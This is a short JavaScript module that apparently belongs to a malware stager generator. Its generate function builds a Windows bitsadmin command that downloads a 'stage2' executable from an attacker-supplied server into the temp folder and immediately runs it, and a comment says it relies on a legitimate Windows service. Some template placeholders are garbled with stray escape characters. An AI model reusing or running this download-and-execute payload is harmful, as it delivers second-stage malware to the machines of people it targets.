function generate(token, serverUrl) {
    // Downloads via bitsadmin (uses legit Windows service)
    // Note: stage2 must be a real .exe for this variant to work
    return `bitsadmin /transfer h\( {token} /download /priority normal " \){serverUrl}/stage2?token=\( {token}" %TEMP%\\h_ \){token}.exe && start %TEMP%\\h_${token}.exe`;
}

module.exports = { generate };
